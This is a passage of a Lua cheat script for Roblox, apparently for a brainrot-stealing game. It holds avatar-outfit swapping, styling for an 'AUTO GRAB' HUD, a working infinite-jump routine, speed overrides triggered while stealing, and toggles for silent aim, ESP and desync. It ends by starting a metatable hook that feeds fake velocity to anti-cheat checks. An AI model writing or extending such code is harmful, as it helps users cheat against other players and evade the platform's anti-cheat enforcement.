        if child.Name:sub(1, #TAG) == TAG
        or child.Name == "AuFfitAccessory"
        or child.Name == "Korblox_RightLeg" then
            pcall(function() child:Destroy() end)
        elseif child:IsA("CharacterMesh") and child.BodyPart == Enum.BodyPart.Head then
            pcall(function() child:Destroy() end)
        end
    end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            local originalTransparency = part:GetAttribute("ViperOutfitOriginalTransparency")
            if originalTransparency ~= nil then
                part.Transparency = originalTransparency
                part:SetAttribute("ViperOutfitOriginalTransparency", nil)
            end
            local originalLocalTransparency = part:GetAttribute("ViperOutfitOriginalLocalTransparency")
            if originalLocalTransparency ~= nil then
                part.LocalTransparencyModifier = originalLocalTransparency
                part:SetAttribute("ViperOutfitOriginalLocalTransparency", nil)
            end
        end
    end
    if _originalAppearance and _originalAppearance.bodyColors then
        local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
        local o = _originalAppearance.bodyColors
        bc.HeadColor3, bc.TorsoColor3 = o.head, o.torso
        bc.LeftArmColor3, bc.RightArmColor3 = o.leftArm, o.rightArm
        bc.LeftLegColor3, bc.RightLegColor3 = o.leftLeg, o.rightLeg
        bc.Parent = char
    end
    local head = char:FindFirstChild("Head")
    if head and head:IsA("MeshPart") and head:GetAttribute("ViperOutfitModifiedMeshPart") then
        pcall(function()
            head.MeshId = head:GetAttribute("ViperOutfitOriginalMeshId") or ""
            head.TextureID = head:GetAttribute("ViperOutfitOriginalTextureId") or ""
        end)
        head:SetAttribute("ViperOutfitModifiedMeshPart", nil)
        head:SetAttribute("ViperOutfitOriginalMeshId", nil)
        head:SetAttribute("ViperOutfitOriginalTextureId", nil)
    elseif head then
        local specialMesh = head:FindFirstChildWhichIsA("SpecialMesh")
        if specialMesh and specialMesh:GetAttribute("ViperOutfitCreatedMesh") then
            specialMesh:Destroy()
        elseif specialMesh and specialMesh:GetAttribute("ViperOutfitModifiedMesh") then
            specialMesh.MeshId = specialMesh:GetAttribute("ViperOutfitOriginalMeshId") or ""
            specialMesh.TextureId = specialMesh:GetAttribute("ViperOutfitOriginalTextureId") or ""
            specialMesh:SetAttribute("ViperOutfitModifiedMesh", nil)
            specialMesh:SetAttribute("ViperOutfitOriginalMeshId", nil)
            specialMesh:SetAttribute("ViperOutfitOriginalTextureId", nil)
        end
    end
end

function applyNoOutfit(char)
    if not char then char = LP.Character end
    if not char then return end
    for _, d in ipairs(char:GetChildren()) do
        if d.Name:sub(1, #TAG) == TAG then pcall(function() d:Destroy() end) end
    end
    local oldAcc = char:FindFirstChild("AuFfitAccessory")
    if oldAcc then pcall(function() oldAcc:Destroy() end) end
    local oldKorblox = char:FindFirstChild("Korblox_RightLeg")
    if oldKorblox then pcall(function() oldKorblox:Destroy() end) end
    for _, d in ipairs(char:GetChildren()) do
        if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then
            pcall(function() d:Destroy() end)
        end
    end
    local head = char:FindFirstChild("Head")
    if head then
        head.Transparency = 0
        head.CanCollide = true
        head.LocalTransparencyModifier = 0
        local face = head:FindFirstChild("face")
        if face then face.Transparency = 0 end
        local sm = head:FindFirstChildWhichIsA("SpecialMesh")
        if sm then
            if _originalAppearance and _originalAppearance.headMesh then
                sm.MeshId = _originalAppearance.headMesh
                sm.TextureId = _originalAppearance.headTexture or ""
            else
                pcall(function() sm:Destroy() end)
            end
        end
    end
    pcall(function()
        local neck = char:FindFirstChild("Neck")
        if neck then neck.Enabled = true end
    end)
    for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
        local limb = char:FindFirstChild(partName)
        if limb then limb.Transparency = 0 end
    end
    if _originalAppearance and _originalAppearance.bodyColors then
        local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
        local o = _originalAppearance.bodyColors
        bc.HeadColor3 = o.head
        bc.TorsoColor3 = o.torso
        bc.LeftArmColor3 = o.leftArm
        bc.RightArmColor3 = o.rightArm
        bc.LeftLegColor3 = o.leftLeg
        bc.RightLegColor3 = o.rightLeg
        bc.Parent = char
    end
    if _originalAppearance and _originalAppearance.shirt then
        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
        s.ShirtTemplate = _originalAppearance.shirt
        s.Parent = char
    end
    if _originalAppearance and _originalAppearance.pants then
        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
        p.PantsTemplate = _originalAppearance.pants
        p.Parent = char
    end
    for _, a in ipairs(char:GetChildren()) do
        if a:IsA("Accessory") then
            local h = a:FindFirstChild("Handle")
            if h then h.Transparency = 0 end
        end
    end
end

local OUTFITS = {
    { label = "OFF", customApply = applyNoOutfit },
    { accessory = 10159600649, offset = _V3new(0, 1, -0.2), shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041", headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", korblox = "none", label = "Outfit 1", headlessKorblox = true },
    { accessory = 1744060292, offset = _V3new(0, 1.3, -0.2), shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041", headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", korblox = "none", label = "Outfit 2", headlessKorblox = true },
    { accessory = 8349240186, offset = _V3new(0, 0.9, 0), shirt = "http://www.roblox.com/asset/?id=11926549070", pants = "http://www.roblox.com/asset/?id=13189494471", headMesh = "https://assetdelivery.roblox.com/v1/asset/?id=16673245747", headTexture = nil, korblox = "none", label = "Outfit 3", headlessKorblox = true },
    { accessory = 121097973925756, offset = _V3new(0, 0.9, 0), shirt = "http://www.roblox.com/asset/?id=123181702116947", pants = "http://www.roblox.com/asset/?id=93330291631062", headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", korblox = "none", label = "Outfit 4", headlessKorblox = true },
    { label = "Outfit 5", customApply = applyHomeroOutfit },
}
local currentOutfitIndex = 1
local outfitSelectorLabel = nil

function loadObjectsStd(id)
    local ok, res = pcall(function() return game:GetObjects("rbxassetid://" .. tostring(id)) end)
    if ok and typeof(res) == "table" and #res > 0 then return res end
    ok, res = pcall(function() return game:GetService("InsertService"):LoadAsset(id) end)
    if ok and res then return {res} end
    return nil
end

function applyHeadlessKorblox(char, skipAvatarTypeChange)
    if not char then return end
    if not skipAvatarTypeChange then
        pcall(function() LP.CharacterAvatarType = Enum.AvatarType.R6 end)
    end
    local head = char:FindFirstChild("Head")
    if head then
        if head:GetAttribute("ViperOutfitOriginalTransparency") == nil then
            head:SetAttribute("ViperOutfitOriginalTransparency", head.Transparency)
            head:SetAttribute("ViperOutfitOriginalLocalTransparency", head.LocalTransparencyModifier)
        end
        head.Transparency = 1
        head.CanCollide = false
        head.LocalTransparencyModifier = 1
        local face = head:FindFirstChild("face")
        if face then face.Transparency = 1 end
    end
    pcall(function()
        local neck = char:FindFirstChild("Neck")
        if neck then neck.Enabled = false end
    end)
    for _, v in pairs(char:GetChildren()) do
        if v:IsA("Accessory") then
            local w = v:FindFirstChildWhichIsA("Weld") or v:FindFirstChildWhichIsA("WeldConstraint") or v:FindFirstChildWhichIsA("Motor6D")
            if w then
                local p0, p1 = w.Part0, w.Part1
                if (p0 and p0.Name == "Head") or (p1 and p1.Name == "Head") then
                    for _, part in ipairs(v:GetDescendants()) do
                        if part:IsA("BasePart") then
                            if part:GetAttribute("ViperOutfitOriginalTransparency") == nil then
                                part:SetAttribute("ViperOutfitOriginalTransparency", part.Transparency)
                                part:SetAttribute("ViperOutfitOriginalLocalTransparency", part.LocalTransparencyModifier)
                            end
                            part.Transparency = 1
                            part.LocalTransparencyModifier = 1
                        end
                    end
                end
            end
        end
    end
    local rightLegConfig = { id = "rbxassetid://139607718", targetBodyPart = "RightUpperLeg", partsToHide = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}, scale = _V3new(1, 1, 1), offset = _CFnew(0, 0, 0) }
    local targetPart = char:FindFirstChild(rightLegConfig.targetBodyPart)
    if targetPart then
        local oldAsset = char:FindFirstChild("Korblox_RightLeg")
        if oldAsset then oldAsset:Destroy() end
        for _, partName in ipairs(rightLegConfig.partsToHide) do
            local limb = char:FindFirstChild(partName)
            if limb and limb:IsA("BasePart") then
                if limb:GetAttribute("ViperOutfitOriginalTransparency") == nil then
                    limb:SetAttribute("ViperOutfitOriginalTransparency", limb.Transparency)
                end
                limb.Transparency = 1
            end
        end
        local success, objects = pcall(function() return game:GetObjects(rightLegConfig.id) end)
        if success and objects and #objects > 0 then
            local assetModel = objects[1]
            assetModel.Name = "Korblox_RightLeg"
            local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
            if mainMesh then
                mainMesh.Size = mainMesh.Size * rightLegConfig.scale
                mainMesh.CanCollide = false
                mainMesh.CFrame = targetPart.CFrame * rightLegConfig.offset
                local weld = Instance.new("WeldConstraint")
                weld.Part0 = targetPart
                weld.Part1 = mainMesh
                weld.Parent = mainMesh
                assetModel.Parent = char
            end
        end
    end
end

function applyOutfitByIndex(index, targetCharacter, previewMode)
    local cfg = OUTFITS[index]
    if not cfg then return end
    local char = targetCharacter or LP.Character
    if not char then return end
    clearPreviousOutfitAssets(char)
    if cfg.customApply then
        cfg.customApply(char)
        if outfitSelectorLabel and not previewMode then outfitSelectorLabel.Text = cfg.label end
        return
    end
    char:WaitForChild("Head", 5)
    local head = char:FindFirstChild("Head")
    if not head then return end
    for _, d in ipairs(char:GetChildren()) do
        if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then
            pcall(function() d:Destroy() end)
        end
    end
    local done = false
    if head:IsA("MeshPart") then
        done = pcall(function()
            if not head:GetAttribute("ViperOutfitModifiedMeshPart") then
                head:SetAttribute("ViperOutfitOriginalMeshId", head.MeshId)
                head:SetAttribute("ViperOutfitOriginalTextureId", head.TextureID)
                head:SetAttribute("ViperOutfitModifiedMeshPart", true)
            end
            head.MeshId = cfg.headMesh
            head.TextureID = cfg.headTexture or ""
        end)
    end
    if not done then
        local sm = head:FindFirstChildWhichIsA("SpecialMesh")
        if not sm then
            sm = Instance.new("SpecialMesh")
            sm:SetAttribute("ViperOutfitCreatedMesh", true)
        elseif not sm:GetAttribute("ViperOutfitModifiedMesh") then
            sm:SetAttribute("ViperOutfitOriginalMeshId", sm.MeshId)
            sm:SetAttribute("ViperOutfitOriginalTextureId", sm.TextureId)
            sm:SetAttribute("ViperOutfitModifiedMesh", true)
        end
        sm.Parent = head
        sm.MeshType = Enum.MeshType.FileMesh
        sm.MeshId = cfg.headMesh
        sm.TextureId = cfg.headTexture or ""
    end
    if cfg.shirt then
        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
        s.Name = "Shirt"
        s.ShirtTemplate = cfg.shirt
        s.Parent = char
    end
    if cfg.pants then
        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
        p.Name = "Pants"
        p.PantsTemplate = cfg.pants
        p.Parent = char
    end
    local old = char:FindFirstChild("AuFfitAccessory")
    if old then old:Destroy() end
    if cfg.accessory and head then
        local objs = loadObjectsStd(cfg.accessory)
        if objs then
            local handle
            for _, o in ipairs(objs) do
                if o:IsA("BasePart") then handle = o; break end
                local f = o:FindFirstChildWhichIsA("BasePart", true)
                if f then handle = f; break end
            end
            if handle then
                local h = handle:Clone()
                h.Name = "AuFfitAccessory"
                h.CanCollide = false
                h.Anchored = false
                h.Massless = true
                h.Parent = char
                local weld = Instance.new("Weld")
                weld.Part0 = head
                weld.Part1 = h
                weld.C0 = _CFnew(cfg.offset)
                weld.Parent = h
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end
    if cfg.headlessKorblox then
        applyHeadlessKorblox(char, previewMode == true)
    else
        if char then
            local head2 = char:FindFirstChild("Head")
            if head2 then
                head2.Transparency = 0
                head2.CanCollide = true
                head2.LocalTransparencyModifier = 0
                local face2 = head2:FindFirstChild("face")
                if face2 then face2.Transparency = 0 end
            end
            pcall(function()
                local neck = char:FindFirstChild("Neck")
                if neck then neck.Enabled = true end
            end)
            for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
                local limb = char:FindFirstChild(partName)
                if limb then limb.Transparency = 0 end
            end
            local oldKorblox = char:FindFirstChild("Korblox_RightLeg")
            if oldKorblox then oldKorblox:Destroy() end
        end
    end
    if outfitSelectorLabel and not previewMode then outfitSelectorLabel.Text = cfg.label end
end

selectedStealMode = "V1"
selectedAutoGrabUI = "V1"

function applyAutoGrabUIVersion(version)
    local previousVersion = selectedAutoGrabUI
    local nextVersion = (version == "V2") and "V2" or "V1"
    selectedAutoGrabUI = nextVersion
    local bar = pbFrame
    if not bar or not bar.Parent then return end
    local animateLayout = (previousVersion ~= nextVersion) and bar.Visible

    local left = bar:FindFirstChild("LeftSection")
    local title = left and left:FindFirstChild("Title")
    local pct = left and left:FindFirstChild("ProgressPct")
    local track = left and left:FindFirstChild("BarBg")
    local right = bar:FindFirstChild("RightSection")
    local divider = bar:FindFirstChild("Divider")
    local stroke = bar:FindFirstChild("OuterStroke")
    local shine = bar:FindFirstChild("TopShine")

    -- V2-only decorative pieces. They are created once and never touch grab logic.
    local v2Badge = left and left:FindFirstChild("V2Badge")
    if left and not v2Badge then
        v2Badge = Instance.new("Frame")
        v2Badge.Name = "V2Badge"
        v2Badge.Size = UDim2.new(0, 66, 0, 17)
        v2Badge.Position = UDim2.new(0, 145, 0, 7)
        v2Badge.BackgroundColor3 = Color3.fromRGB(255, 112, 24)
        v2Badge.BackgroundTransparency = 0.82
        v2Badge.BorderSizePixel = 0
        v2Badge.ZIndex = 505
        v2Badge.Parent = left
        Instance.new("UICorner", v2Badge).CornerRadius = UDim.new(1, 0)
        local badgeStroke = Instance.new("UIStroke", v2Badge)
        badgeStroke.Name = "BadgeStroke"
        badgeStroke.Color = Color3.fromRGB(255, 139, 54)
        badgeStroke.Thickness = 1
        badgeStroke.Transparency = 0.35
        local badgeText = Instance.new("TextLabel")
        badgeText.Name = "BadgeText"
        badgeText.Size = UDim2.new(1, 0, 1, 0)
        badgeText.BackgroundTransparency = 1
        badgeText.Text = "V2  /  ELITE"
        badgeText.TextColor3 = Color3.fromRGB(255, 190, 137)
        badgeText.Font = Enum.Font.GothamBold
        badgeText.TextSize = 8
        badgeText.ZIndex = 506
        badgeText.Parent = v2Badge
    end

    local v2Caption = left and left:FindFirstChild("V2Caption")
    if left and not v2Caption then
        v2Caption = Instance.new("TextLabel")
        v2Caption.Name = "V2Caption"
        v2Caption.BackgroundTransparency = 1
        v2Caption.Size = UDim2.new(0, 125, 0, 12)
        v2Caption.Position = UDim2.new(0, 80, 0, 31)
        v2Caption.Text = "GRAB PROGRESS"
        v2Caption.TextColor3 = Color3.fromRGB(147, 145, 157)
        v2Caption.Font = Enum.Font.GothamMedium
        v2Caption.TextSize = 8
        v2Caption.TextXAlignment = Enum.TextXAlignment.Left
        v2Caption.ZIndex = 504
        v2Caption.Parent = left
    end

    -- Remember the current layout only when switching versions; after the
    -- target geometry is assigned below, it will be tweened from this snapshot.
    local layoutObjects = {bar, left, title, pct, track, right, divider, shine}
    local oldGeometry = {}
    if animateLayout then
        for _, obj in ipairs(layoutObjects) do
            if obj then
                oldGeometry[obj] = {Size = obj.Size, Position = obj.Position}
            end
        end
    end

    if selectedAutoGrabUI == "V1" then
        bar.Size = UDim2.new(0, 340, 0, 66)
        bar.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
        if left then left.Size = UDim2.new(1, -100, 1, 0) end
        if title then
            title.Position = UDim2.new(0, 14, 0, 6)
            title.Size = UDim2.new(1, -14, 0, 18)
            title.Text = "AUTO GRAB"
            title.TextSize = 10
        end
        if pct then
            pct.Position = UDim2.new(0, 12, 0, 16)
            pct.Size = UDim2.new(0, 70, 0, 20)
            pct.TextSize = 16
        end
        if track then
            track.Position = UDim2.new(0, 10, 1, -26)
            track.Size = UDim2.new(1, -16, 0, 18)
        end
        if right then
            right.Size = UDim2.new(0, 88, 1, 0)
            right.Position = UDim2.new(1, -93, 0, 0)
        end
        if divider then
            divider.Position = UDim2.new(1, -95, 0, 8)
            divider.Size = UDim2.new(0, 1, 1, -16)
        end
        if stroke then
            stroke.Color = getThemeColor()
            stroke.Thickness = 1.6
        end
        if shine then shine.Visible = true end
        if v2Badge then v2Badge.Visible = false end
        if v2Caption then v2Caption.Visible = false end
    else
        -- V2: a more premium compact HUD: stronger hierarchy, slim progress rail,
        -- orange glass badge, calmer FPS/Ping column, and more breathing room.
        bar.Size = UDim2.new(0, 360, 0, 84)
        bar.BackgroundColor3 = Color3.fromRGB(9, 8, 13)
        bar.BackgroundTransparency = 0.04
        if left then left.Size = UDim2.new(1, -96, 1, 0) end
        if title then
            title.Position = UDim2.new(0, 14, 0, 7)
            title.Size = UDim2.new(0, 126, 0, 17)
            title.Text = "AUTO GRAB"
            title.TextSize = 12
            title.TextColor3 = Color3.fromRGB(255, 224, 204)
        end
        if pct then
            pct.Position = UDim2.new(0, 12, 0, 25)
            pct.Size = UDim2.new(0, 70, 0, 30)
            pct.TextSize = 24
            pct.TextColor3 = Color3.fromRGB(255, 255, 255)
            pct.TextStrokeTransparency = 1
        end
        if track then
            track.Position = UDim2.new(0, 12, 1, -17)
            track.Size = UDim2.new(1, -25, 0, 7)
            track.BackgroundColor3 = Color3.fromRGB(35, 24, 25)
            track.BackgroundTransparency = 0
            local trackStroke = track:FindFirstChild("TrackStroke")
            if not trackStroke then
                trackStroke = Instance.new("UIStroke")
                trackStroke.Name = "TrackStroke"
                trackStroke.Thickness = 0.7
                trackStroke.Transparency = 0.45
                trackStroke.Parent = track
            end
            trackStroke.Color = Color3.fromRGB(120, 63, 48)
        end
        if right then
            right.Size = UDim2.new(0, 82, 1, 0)
            right.Position = UDim2.new(1, -86, 0, 0)
        end
        if divider then
            divider.Position = UDim2.new(1, -91, 0, 12)
            divider.Size = UDim2.new(0, 1, 1, -24)
            divider.BackgroundTransparency = 0.25
        end
        if stroke then
            stroke.Color = Color3.fromRGB(255, 112, 24)
            stroke.Thickness = 1.35
            stroke.Transparency = 0.05
        end
        if shine then
            shine.Visible = true
            shine.Size = UDim2.new(1, -30, 0, 1)
            shine.Position = UDim2.new(0, 15, 0, 2)
            shine.BackgroundColor3 = Color3.fromRGB(255, 174, 115)
            shine.BackgroundTransparency = 0.68
        end
        if v2Badge then v2Badge.Visible = true end
        if v2Caption then v2Caption.Visible = true end
    end

    local grad = bar:FindFirstChild("PanelGrad")
    if grad then
        grad.Rotation = selectedAutoGrabUI == "V2" and 125 or 135
        grad.Color = selectedAutoGrabUI == "V2"
            and ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(39, 18, 20)),
                ColorSequenceKeypoint.new(0.42, Color3.fromRGB(17, 11, 16)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 6, 10)),
            })
            or ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 26, 32)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 12, 16)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 7, 10)),
            })
    end

    -- Make the V2 fill feel smoother and more refined without changing its value.
    if progressFill then
        local fillCorner = progressFill:FindFirstChildOfClass("UICorner")
        if fillCorner then fillCorner.CornerRadius = UDim.new(1, 0) end
    end

    if animateLayout then
        local targetGeometry = {}
        for obj, old in pairs(oldGeometry) do
            if obj and obj.Parent then
                targetGeometry[obj] = {Size = obj.Size, Position = obj.Position}
                obj.Size = old.Size
                obj.Position = old.Position
            end
        end

        local layoutTween = TweenInfo.new(0.34, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
        for obj, target in pairs(targetGeometry) do
            if obj and obj.Parent then
                TS:Create(obj, layoutTween, target):Play()
            end
        end

        -- A separate scale keeps the user's existing Auto Grab size setting intact.
        local springScale = bar:FindFirstChild("VersionSpringScale")
        if not springScale then
            springScale = Instance.new("UIScale")
            springScale.Name = "VersionSpringScale"
            springScale.Scale = 1
            springScale.Parent = bar
        end
        springScale.Scale = 0.965
        TS:Create(springScale, TweenInfo.new(0.38, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Scale = 1
        }):Play()

        if nextVersion == "V2" then
            if v2Badge then
                local badgeTarget = v2Badge.BackgroundTransparency
                local badgeStroke = v2Badge:FindFirstChild("BadgeStroke")
                local badgeStrokeTarget = badgeStroke and badgeStroke.Transparency or 0.35
                local badgeText = v2Badge:FindFirstChild("BadgeText")
                local badgeTextTarget = badgeText and badgeText.TextTransparency or 0
                v2Badge.BackgroundTransparency = 1
                if badgeStroke then badgeStroke.Transparency = 1 end
                if badgeText then badgeText.TextTransparency = 1 end
                TS:Create(v2Badge, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                    BackgroundTransparency = badgeTarget
                }):Play()
                if badgeStroke then
                    TS:Create(badgeStroke, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                        Transparency = badgeStrokeTarget
                    }):Play()
                end
                if badgeText then
                    TS:Create(badgeText, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                        TextTransparency = badgeTextTarget
                    }):Play()
                end
            end
            if v2Caption then
                local captionTarget = v2Caption.TextTransparency
                v2Caption.TextTransparency = 1
                TS:Create(v2Caption, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                    TextTransparency = captionTarget
                }):Play()
            end
        end
    end
end

speedMode = false
antiRagdollMode = "off"
antiDieEnabled = false
antiBatEnabled = false
antiFlingEnabled = false
jumpEnabled = false
laggerToggled = false
laggerCarryToggled = false
desyncSpeedToggled = false
desyncCarryToggled = false
medusaCounterEnabled = false
batCounterEnabled = false
unwalkEnabled = false
autoLeftEnabled = false
autoRightEnabled = false
autoBatEnabled = false
silentAimEnabled = false
autoMedusaEnabled = false
silentAimStudRange = 15
autoMedusaStudRange = 15
silentAimRangeBox = nil
autoMedusaRangeBox = nil
dropMode = 1
antiLagEnabled = false
removeAccessoriesEnabled = false
stretchEnabled = false
stretchFOV = 120
uiLocked = false
mobileButtonsLocked = false
uiScaleValue = 78
espEnabled = false
espLineEnabled = false

vividGraphicsEnabled = false
_vividEffects = {}
setVividVisual = nil

hideButtonsEnabled = false
setHideButtonsVisual = nil

bodyLockEnabled = false
bodyLockRange = 20
bodyLockRangeBox = nil
_bodyLockConn = nil
_blSuppressCount = 0
_blWasEnabled = false
_blRestoreTimer = nil
_blSmoothRestore = false

savedProgressBarPos = nil
savedButtonPositions = {}
savedMobilePanelPos = nil

neonWeatherEnabled = false
skyTheme = "Off"
skySelectorLabel = nil
_originalLighting = nil
setNeonWeatherVisual = nil

currentAnimPack = "Off"
originalTryardAnims = nil
tryardHeartbeatConn = nil
animSelectorLabel = nil

lastMoveDir = _V3zero

local CoreGui = game:GetService("CoreGui")

local InfiniteJump = { enabled = false, jumpPower = 55, minVelocity = 35, fallClamp = -120, jumpConn = nil, heartbeatConn = nil }

function applyJump(root)
    if not root then return end
    pcall(function()
        root.Velocity = _V3new(root.Velocity.X, InfiniteJump.jumpPower, root.Velocity.Z)
    end)
end

function onJumpRequest()
    if not InfiniteJump.enabled then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then applyJump(root) end
end

function onHeartbeat()
    if not InfiniteJump.enabled then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local jumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
    if jumpHeld and root.Velocity.Y < InfiniteJump.minVelocity then
        applyJump(root)
    end
    if root.Velocity.Y < InfiniteJump.fallClamp then
        root.Velocity = _V3new(root.Velocity.X, InfiniteJump.fallClamp, root.Velocity.Z)
    end
end

function connectEvents()
    if InfiniteJump.jumpConn then InfiniteJump.jumpConn:Disconnect() end
    if InfiniteJump.heartbeatConn then InfiniteJump.heartbeatConn:Disconnect() end
    InfiniteJump.jumpConn = UIS.JumpRequest:Connect(onJumpRequest)
    InfiniteJump.heartbeatConn = RunService.Heartbeat:Connect(onHeartbeat)
end

function InfiniteJump.start()
    if InfiniteJump.enabled then return end
    InfiniteJump.enabled = true
    connectEvents()
end

function InfiniteJump.stop()
    InfiniteJump.enabled = false
    if InfiniteJump.jumpConn then InfiniteJump.jumpConn:Disconnect(); InfiniteJump.jumpConn = nil end
    if InfiniteJump.heartbeatConn then InfiniteJump.heartbeatConn:Disconnect(); InfiniteJump.heartbeatConn = nil end
end

function InfiniteJump.setJumpPower(power)
    power = tonumber(power) or 55
    InfiniteJump.jumpPower = _clamp(power, 10, 200)
end

function InfiniteJump.isRunning() return InfiniteJump.enabled == true end

pcall(InfiniteJump.start)

-- Proximity & Brainrot Holding detection for Auto Steal & Smooth Stealing
local _grabPromptShown = false
pcall(function()
    local pps = game:GetService("ProximityPromptService")
    pps.PromptShown:Connect(function(prompt)
        local act = (prompt.ActionText or ""):lower()
        local obj = (prompt.ObjectText or ""):lower()
        if act:find("steal") or act:find("grab") or act:find("take") or obj:find("brainrot") or act == "" then
            _grabPromptShown = true
            if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
        end
    end)
    pps.PromptHidden:Connect(function(prompt)
        _grabPromptShown = false
        if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
    end)
end)

function isHoldingBrainrot(char)
    char = char or LP.Character
    if not char then return false end
    if LP:GetAttribute("Stealing") == true or char:GetAttribute("Stealing") == true then
        return true
    end
    if LP:GetAttribute("Carrying") == true or char:GetAttribute("Carrying") == true then
        return true
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Tool") then
            local n = child.Name:lower()
            if not (n:find("bat") or n:find("slap") or n:find("punch") or n:find("fist") or n:find("medusa")) then
                return true
            end
        end
        if child:IsA("Model") or child:IsA("BasePart") then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("ball") or n:find("carried") or child:GetAttribute("Brainrot") == true then
                return true
            end
        end
    end
    return false
end

function isNearGrabPrompt()
    if _grabPromptShown then return true end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return false end
    local rpos = root.Position

    local plotsRoot = workspace:FindFirstChild("Plots")
    if plotsRoot then
        for _, plot in ipairs(plotsRoot:GetChildren()) do
            local sign = plot:FindFirstChild("PlotSign")
            local isMyBase = false
            if sign then
                local yb = sign:FindFirstChild("YourBase")
                if yb and yb:IsA("BillboardGui") and yb.Enabled == true then isMyBase = true end
            end
            if not isMyBase then
                local pods = plot:FindFirstChild("AnimalPodiums")
                if pods then
                    for _, pod in ipairs(pods:GetChildren()) do
                        local base = pod:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        if spawn then
                            local dist = (spawn.Position - rpos).Magnitude
                            if dist <= 16 then return true end
                        end
                    end
                end
            end
        end
    end

    for _, item in ipairs(workspace:GetChildren()) do
        if item:IsA("Model") or item:IsA("BasePart") or item:IsA("Tool") then
            local prompt = item:FindFirstChildWhichIsA("ProximityPrompt", true)
            if prompt and prompt.Enabled then
                local pPart = prompt.Parent
                if pPart:IsA("Attachment") then pPart = pPart.Parent end
                if pPart and pPart:IsA("BasePart") then
                    if (pPart.Position - rpos).Magnitude <= (prompt.MaxActivationDistance or 12) + 3 then
                        return true
                    end
                end
            end
        end
    end
    return false
end

function getActiveMoveSpeed()
    local char = LP.Character
    local isCarrying = isHoldingBrainrot(char)
    if isCarrying and (CONFIG.AUTO_STEAL_ENABLED or speedMode) then
        if desyncCarryToggled or desyncSpeedToggled then return DESYNC_STEAL_SPEED or 35 end
        if laggerCarryToggled or laggerToggled then return LAGGER_CARRY_SPEED end
        return CS
    end
    if CONFIG.SMOOTH_STEAL_ENABLED and isNearGrabPrompt() and not isCarrying then
        return CONFIG.SMOOTH_STEAL_SPEED or 28
    end
    if desyncCarryToggled then return DESYNC_STEAL_SPEED or 35
    elseif desyncSpeedToggled then return DESYNC_SPEED or 47
    elseif laggerCarryToggled then return LAGGER_CARRY_SPEED
    elseif laggerToggled then return LAGGER_SPEED
    elseif speedMode then return CS
    else return NS end
end

function getSpeedModeName()
    local char = LP.Character
    local isCarrying = isHoldingBrainrot(char)
    if isCarrying and (CONFIG.AUTO_STEAL_ENABLED or speedMode) then
        if desyncCarryToggled or desyncSpeedToggled then return "DESYNC STEAL" end
        if laggerCarryToggled or laggerToggled then return "LAGGER CARRY" end
        return "CARRY"
    end
    if CONFIG.SMOOTH_STEAL_ENABLED and isNearGrabPrompt() and not isCarrying then
        return "SMOOTH"
    end
    if desyncCarryToggled then return "DESYNC CARRY"
    elseif desyncSpeedToggled then return "DESYNC"
    elseif laggerToggled or laggerCarryToggled then return "LAGGER"
    elseif speedMode then return "CARRY"
    else return "NORMAL" end
end

-- =====================================================================
-- [FIX SPEED VIOLETTE] VELOCITY HOOK
-- Ahora instala DOS hooks sobre el metatable de game:
--   __index:    devuelve _s2VelState.v (velocidad fake) a contexto externo
--   __newindex: captura escrituras externas sin aplicarlas
-- Además usa un storage compartido en _s2VelState.v para el valor visible.
-- =====================================================================
local _s2VelState = _G.__ViperSpeedHookState
if type(_s2VelState) ~= "table" then
    _s2VelState = {
        hooked = false,
        velChecked = setmetatable({}, { __mode = "k" }),
        root = nil,
        v = _V3zero,
    }
    _G.__ViperSpeedHookState = _s2VelState
end
local _velChecked = _s2VelState.velChecked
